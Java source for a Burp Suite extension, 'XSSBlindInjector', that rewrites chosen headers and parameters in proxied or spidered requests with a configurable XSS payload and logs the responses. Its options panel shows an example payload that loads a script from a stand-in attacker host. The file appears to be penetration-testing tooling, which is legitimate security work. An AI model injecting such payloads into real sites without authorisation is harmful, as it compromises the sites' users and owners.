package burp;

import gui.UITools;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.awt.event.*;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.UUID;
import java.util.regex.Pattern;

public class BurpExtender extends AbstractTableModel implements IBurpExtender,
        ITab, IMessageEditorController, IHttpListener {
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private JSplitPane splitPane;
    private IMessageEditor requestViewer;
    private IMessageEditor responseViewer;
    private final List<LogEntry> log = new ArrayList<LogEntry>();
    private IHttpRequestResponse currentlyDisplayedItem;
    private boolean isOpen = true;// 插件是否生效
    private String ipValue;// 指定IP值
    private Pattern hosts;//hosts pattern
    private List<String> headers ;
    private List<String> params;
    private String payload;
    private boolean xssed;//对当前请求xss


    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        helpers = callbacks.getHelpers();
        callbacks.setExtensionName("XSSBlindInjector"); // 插件名称
        // 开始创建自定义UI
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                //绘制过程
                //1.创建上下布局的主面板

                // 主面板
                splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);//上下布局
                JTabbedPane topTabs = new JTabbedPane();
                // HistoryLog 视图
                Table logTable = new Table(BurpExtender.this);
                JScrollPane scrollPane = new JScrollPane(logTable);//xss history视图可滚动
                // 创建【options】显示面板
                JPanel optionsPanel = BurpExtender.this.createOptionsPanel();
                //JPanel optionsPanel = new UITools().createOptionJpanel();
                // 创建about面板
                JPanel aboutPanel = new UITools().createAboutJpanel();


                // 添加主面板的上半部分中，分两个tab页
                topTabs.add("Options", optionsPanel);
                topTabs.add("XSSLog", scrollPane);
                topTabs.add("About", aboutPanel);
                splitPane.setTopComponent(topTabs);


                // request/response 视图
                JTabbedPane tabs = new JTabbedPane();
                requestViewer = callbacks.createMessageEditor(
                        BurpExtender.this, false);
                responseViewer = callbacks.createMessageEditor(
                        BurpExtender.this, false);

                // 添加主面板的下半部分中，分两个tab页
                tabs.addTab("Request", requestViewer.getComponent());
                tabs.addTab("Response", responseViewer.getComponent());

                splitPane.setBottomComponent(tabs);

                // 自定义自己的组件
                callbacks.customizeUiComponent(splitPane);
                callbacks.customizeUiComponent(topTabs);
                callbacks.customizeUiComponent(tabs);

                // 在Burp添加自定义插件的tab页
                callbacks.addSuiteTab(BurpExtender.this);

                // 注册HTTP listener
                callbacks.registerHttpListener(BurpExtender.this);
            }
        });
    }

    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest,
                                   IHttpRequestResponse messageInfo) {
        // request response到达时都会触发该请求
        //如果插件未启用，则跳出不执行
        if (!isOpen) return;
        try {
            // 不同的toolflag代表了不同的burp组件，如INTRUDER,SCANNER,PROXY,SPIDER
            //通过proxy手动点击浏览的时候可以自动化插入xss payload
            //通过spider爬取整站的时候也可以自动化插入xss payload
            if (toolFlag == callbacks.TOOL_PROXY || toolFlag == callbacks.TOOL_SPIDER) {
                if (messageIsRequest) { // 对请求包进行处理
                    xssed=false;
                    IRequestInfo analyzeRequest = helpers.analyzeRequest(messageInfo); // 对消息体进行解析
                    URL url=analyzeRequest.getUrl();
                    List<String> req_headers = analyzeRequest.getHeaders();
                    List<IParameter> req_parameters=analyzeRequest.getParameters();

                    //正则判断该请求是否在hosts的范围里
                    if(!hosts.matcher(url.getHost()).find()){
                        return;
                    }

                    //判断headers是否需要xss
                    //0 为 Get或Post
                    for(int i=1;i<req_headers.size();i++){
                        String current_header_name = req_headers.get(i).split(":")[0];
                        for(int j=0;j<headers.size();j++){
                           if(current_header_name.equals(headers.get(j))){
                               //拼接xss payload到指定header
                               req_headers.set(i,current_header_name+": "+helpers.urlEncode(payload));
//                               System.out.println("xssed "+current_header_name);
                               xssed=true;
                           }
                        }
                    }

                    String request = new String(messageInfo.getRequest());
                    byte[] body = request.substring(analyzeRequest.getBodyOffset()).getBytes();
                    byte[] newRequest = helpers.buildHttpMessage(req_headers, body);

                    //判断params是否需要xss
                    for(int i=0;i<req_parameters.size();i++){
                        final IParameter cur_parameter=req_parameters.get(i);
                        //参数共有7种格式，0是URL参数，1是body参数，2是cookie参数，6是json格式参数
                        for(int j=0;j<params.size();j++){
                            if(params.get(j).equals(cur_parameter.getName())){
                                //修改相应参数,这里不支持更新json格式的parameter
                                IParameter new_parameter=helpers.buildParameter(cur_parameter.getName(),helpers.urlEncode(payload),cur_parameter.getType());
                                newRequest=helpers.updateParameter(newRequest,new_parameter);
                                xssed=true;
                            }
                        }
                    }
                    messageInfo.setRequest(newRequest);// 设置最终新的请求包
                }
                //response到达
                else{
                    //正则判断该请求是否在hosts的范围里（此时的messageinfo包含request和response）
                    if(!hosts.matcher(helpers.analyzeRequest(messageInfo).getUrl().getHost()).find()){
                        return;
                    }
                    //判断该请求是否已经xss了
                    if(!xssed){
                        return;
                    }
                    //判断有无xss payload,有的话就记录
                    IResponseInfo analyzeResponse = helpers.analyzeResponse(messageInfo.getResponse());
                    //添加消息到HistoryLog记录中，供UI显示用
                    synchronized (log) {
                        int row = log.size();
                        short httpcode = analyzeResponse.getStatusCode();
                        log.add(new LogEntry(callbacks.saveBuffersToTempFiles(messageInfo), helpers.analyzeRequest(messageInfo).getUrl(), httpcode));
                        fireTableRowsInserted(row, row);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 创建options视图对象主方法
     *
     * @return options 视图对象
     * @author Conan0xff 2018-09-23 下午5:51:45
     */
    //由于该方法涉及到修改内部变量,故放在类内
    public JPanel createOptionsPanel() {
        GridBagLayout gridBagLayout = new GridBagLayout(); //实例化布局对象
        final JPanel optionsPanel = new JPanel(gridBagLayout);
        GridBagConstraints gridBagConstraints = new GridBagConstraints();//实例化这个对象用来对组件进行管理
        gridBagConstraints.fill = GridBagConstraints.BOTH;//该方法是为了设置如果组件所在的区域比组件本身要大时的显示情况
        //NONE：不调整组件大小。
        //HORIZONTAL：加宽组件，使它在水平方向上填满其显示区域，但是不改变高度。
        //VERTICAL：加高组件，使它在垂直方向上填满其显示区域，但是不改变宽度。
        //BOTH：使组件完全填满其显示区域。

        //XSSBlindInjector复选框
        final JCheckBox isOpenCheck = new JCheckBox("start XSSBlindInjector", false);
        //hosts
        final JLabel hosts_label = new JLabel("hosts:");
        final JTextField hosts_Text = new JTextField("", 15);
        hosts_Text.setBackground(Color.WHITE);
        JLabel hosts_label_detail = new JLabel("eg:*.google.com");
        hosts_label_detail.setBackground(Color.GRAY);
        //payload
        final JLabel payload_label = new JLabel("payload:");
        final JTextField payload_Text = new JTextField("", 15);
        payload_Text.setBackground(Color.WHITE);
        JLabel payload_label_detail = new JLabel("eg:'\"><script src=http://hacker.com/evil.js></script>");
        payload_label_detail.setBackground(Color.GRAY);
        //指定要插入xss的header和params,逗号分隔多个header和params
        JLabel headers_label = new JLabel("xss headers:");
        final JTextField headers_Text = new JTextField("", 15);
        headers_Text.setBackground(Color.WHITE);
        JLabel headers_label_detail = new JLabel("eg:Referer,X-Forward-For");
        headers_label_detail.setBackground(Color.GRAY);
        JLabel params_label = new JLabel("xss params:");
        final JTextField params_Text = new JTextField("", 15);
        params_Text.setBackground(Color.WHITE);
        JLabel params_label_detail = new JLabel("eg:username,address");
        params_label_detail.setBackground(Color.GRAY);

        //为复选框和单选按钮添加监听事件
        isOpenCheck.addItemListener(new ItemListener() {
            public void itemStateChanged(ItemEvent e) {
                if (isOpenCheck.isSelected()) {
                    isOpen = true;
                    hosts_Text.setEditable(true);
                    headers_Text.setEditable(true);
                    params_Text.setEditable(true);
                    payload_Text.setEditable(true);
                } else {
                    isOpen = false;
                    hosts_Text.setEditable(false);
                    headers_Text.setEditable(false);
                    params_Text.setEditable(false);
                    payload_Text.setEditable(false);
                }
            }
        });

        hosts_Text.addFocusListener(new FocusListener() {
            @Override
            public void focusGained(FocusEvent e) {
                hosts_Text.setBackground(Color.GRAY);
            }

            @Override
            public void focusLost(FocusEvent e) {
                hosts=Pattern.compile(hosts_Text.getText());
                hosts_Text.setBackground(Color.WHITE);
//                JOptionPane.showMessageDialog(optionsPanel,hosts.toString());
            }
        });

        headers_Text.addFocusListener(new FocusListener() {
            @Override
            public void focusGained(FocusEvent e) {
                headers_Text.setBackground(Color.GRAY);
            }

            @Override
            public void focusLost(FocusEvent e) {
                headers=java.util.Arrays.asList(headers_Text.getText().split(","));
                headers_Text.setBackground(Color.WHITE);
//                JOptionPane.showMessageDialog(optionsPanel,headers.toString());
            }
        });

        params_Text.addFocusListener(new FocusListener() {
            @Override
            public void focusGained(FocusEvent e) {
                params_Text.setBackground(Color.GRAY);
            }

            @Override
            public void focusLost(FocusEvent e) {
                params=java.util.Arrays.asList(params_Text.getText().split(","));
                params_Text.setBackground(Color.WHITE);
//                JOptionPane.showMessageDialog(optionsPanel,params.toString());
            }
        });

        payload_Text.addFocusListener(new FocusListener() {
            @Override
            public void focusGained(FocusEvent e) {
                payload_Text.setBackground(Color.GRAY);
            }

            @Override
            public void focusLost(FocusEvent e) {
                payload=payload_Text.getText();
                payload_Text.setBackground(Color.WHITE);
//                JOptionPane.showMessageDialog(optionsPanel,payload.toString());
            }
        });
        /*
         * 分别对组件进行设置
         */
        gridBagConstraints.gridx = 0;
        gridBagConstraints.gridy = 0;
        gridBagConstraints.gridwidth = 5;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(isOpenCheck, gridBagConstraints);

        gridBagConstraints.gridx = 0;
        gridBagConstraints.gridy = 1;
        gridBagConstraints.gridwidth = 1;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(hosts_label, gridBagConstraints);
        gridBagConstraints.gridx = 1;
        gridBagConstraints.gridy = 1;
        gridBagConstraints.gridwidth = 2;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(hosts_Text, gridBagConstraints);
        gridBagConstraints.gridx = 3;
        gridBagConstraints.gridy = 1;
        gridBagConstraints.gridwidth = 2;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(hosts_label_detail, gridBagConstraints);

        gridBagConstraints.gridx = 0;
        gridBagConstraints.gridy = 2;
        gridBagConstraints.gridwidth = 1;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(headers_label, gridBagConstraints);
        gridBagConstraints.gridx = 1;
        gridBagConstraints.gridy = 2;
        gridBagConstraints.gridwidth = 2;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(headers_Text, gridBagConstraints);
        gridBagConstraints.gridx = 3;
        gridBagConstraints.gridy = 2;
        gridBagConstraints.gridwidth = 2;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(headers_label_detail, gridBagConstraints);

        gridBagConstraints.gridx = 0;
        gridBagConstraints.gridy = 3;
        gridBagConstraints.gridwidth = 1;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(params_label, gridBagConstraints);
        gridBagConstraints.gridx = 1;
        gridBagConstraints.gridy = 3;
        gridBagConstraints.gridwidth = 2;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(params_Text, gridBagConstraints);
        gridBagConstraints.gridx = 3;
        gridBagConstraints.gridy = 3;
        gridBagConstraints.gridwidth = 2;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(params_label_detail, gridBagConstraints);

        gridBagConstraints.gridx = 0;
        gridBagConstraints.gridy = 4;
        gridBagConstraints.gridwidth = 1;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(payload_label, gridBagConstraints);
        gridBagConstraints.gridx = 1;
        gridBagConstraints.gridy = 4;
        gridBagConstraints.gridwidth = 2;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(payload_Text, gridBagConstraints);
        gridBagConstraints.gridx = 3;
        gridBagConstraints.gridy = 4;
        gridBagConstraints.gridwidth = 2;
        gridBagConstraints.gridheight = 1;
        gridBagLayout.setConstraints(payload_label_detail, gridBagConstraints);


        //设置完成后再添加到panel中
        optionsPanel.add(isOpenCheck);
        optionsPanel.add(hosts_label);
        optionsPanel.add(hosts_Text);
        optionsPanel.add(hosts_label_detail);
        optionsPanel.add(payload_label);
        optionsPanel.add(payload_Text);
        optionsPanel.add(payload_label_detail);
        optionsPanel.add(headers_label);
        optionsPanel.add(headers_Text);
        optionsPanel.add(headers_label_detail);
        optionsPanel.add(params_label);
        optionsPanel.add(params_Text);
        optionsPanel.add(params_label_detail);

        return optionsPanel;
    }

    /**
     * IP值生成函数
     *
     * @param isAuto 是否自动生成
     * @return IP值
     * @author t0data 2016-11-18 下午5:56:09
     */
    public String getIpValue(boolean isAuto) {
        if (isAuto) {
            return RandomIP.RandomIPstr();
        } else {
            return ipValue;

        }
    }

    public static String getUUID() {
        UUID uuid = UUID.randomUUID();
        String str = uuid.toString();
        String uuidStr = str.replace("-", "");
        return uuidStr;
    }

    @Override
    public String getTabCaption() {
        return "XSSBlindInjector";
    }

    @Override
    public Component getUiComponent() {
        return splitPane;
    }

    @Override
    public int getRowCount() {
        return log.size();
    }

    @Override
    public int getColumnCount() {
        return 3;
    }

    @Override
    public String getColumnName(int columnIndex) {
        switch (columnIndex) {
            case 0:
                return "ID";
            case 1:
                return "URL";
            case 2:
                return "STATUS";
            default:
                return "";
        }
    }

    @Override
    public Class<?> getColumnClass(int columnIndex) {
        return String.class;
    }

    @Override
    public Object getValueAt(int rowIndex, int columnIndex) {
        LogEntry logEntry = log.get(rowIndex);

        switch (columnIndex) {
            case 0:
                return logEntry.ID;
            case 1:
                return logEntry.url.toString();
            case 2:
                return logEntry.httpCode;
            default:
                return "";
        }
    }

    //
    // implement IMessageEditorController
    // this allows our request/response viewers to obtain details about the
    // messages being displayed
    //

    @Override
    public byte[] getRequest() {
        return currentlyDisplayedItem.getRequest();
    }

    @Override
    public byte[] getResponse() {
        return currentlyDisplayedItem.getResponse();
    }

    @Override
    public IHttpService getHttpService() {
        return currentlyDisplayedItem.getHttpService();
    }

    //
    // extend JTable to handle cell selection
    //

    private class Table extends JTable {
        public Table(TableModel tableModel) {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle,
                                    boolean extend) {
            // show the log entry for the selected row
            LogEntry logEntry = log.get(row);
            requestViewer.setMessage(logEntry.requestResponse.getRequest(),
                    true);
            responseViewer.setMessage(logEntry.requestResponse.getResponse(),
                    false);
            currentlyDisplayedItem = logEntry.requestResponse;
            super.changeSelection(row, col, toggle, extend);
        }
    }

    //
    // class to hold details of each log entry
    //

    private static class LogEntry {
        final IHttpRequestResponsePersisted requestResponse;
        final String ID;
        final URL url;
        final short httpCode;

        LogEntry(IHttpRequestResponsePersisted requestResponse,
                 URL url, short httpCode) {
            this.ID = getUUID();
            this.requestResponse = requestResponse;
            this.url = url;
            this.httpCode = httpCode;
        }
    }
}